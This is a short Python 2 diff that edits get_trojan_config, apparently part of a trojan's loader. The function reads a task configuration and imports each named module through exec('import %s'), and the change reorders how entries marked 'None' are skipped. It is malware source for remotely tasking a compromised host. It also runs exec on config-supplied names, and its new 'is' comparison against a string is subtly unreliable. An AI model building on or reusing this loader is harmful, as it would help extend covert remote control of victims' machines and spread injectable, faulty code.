@@ -49,10 +49,11 @@ def get_trojan_config():
     configured  = True
     print config
     for task in config:
+        if task['module'] is u'None':
+            continue
         print task['module']
-        if task['module'] is not "None":
-            if task['module'] not in sys.modules:
-                exec ("import %s" % task['module'])
+        if task['module'] not in sys.modules:
+            exec ("import %s" % task['module'])
 
     return config
 
